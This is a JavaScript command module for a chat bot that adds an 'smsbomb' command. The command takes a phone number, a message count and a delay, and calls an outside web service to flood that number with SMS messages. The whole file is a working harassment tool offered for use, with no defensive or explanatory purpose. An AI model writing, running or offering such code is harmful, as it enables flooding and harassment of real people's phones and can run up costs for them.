const axios = require('axios');

module.exports = {
  name: 'smsbomb',
  description: 'SMS Bomber Command',
  usage: '[nashPrefix]smsbomb [phone] [amount] [cooldown]',
  nashPrefix: false,
  execute: async (api, event, args, prefix) => {
    const [phone, amount, cooldown] = args;
    const responseMessage = { text: '' };

    if (!phone || !amount || !cooldown) {
      responseMessage.text = 'Usage: smsbomb [phone] [amount] [cooldown]';
      return api.sendMessage(responseMessage.text, event.threadID);
    }

    responseMessage.text = 'Starting SMS bombing...';
    api.sendMessage(responseMessage.text, event.threadID);

    try {
      const response = await axios.get('https://joshweb.click/smsb', {
        params: {
          number: phone,
          amount: amount,
          delay: cooldown
        }
      });
      const data = response.data;
      console.log('Response:', data);

      responseMessage.text = 'Success: All SMSs have been sent!';
    } catch (error) {
      console.error('Error:', error);

      responseMessage.text = 'Error: Failed to send SMSs.';
    }

    api.sendMessage(responseMessage.text, event.threadID);
  }
};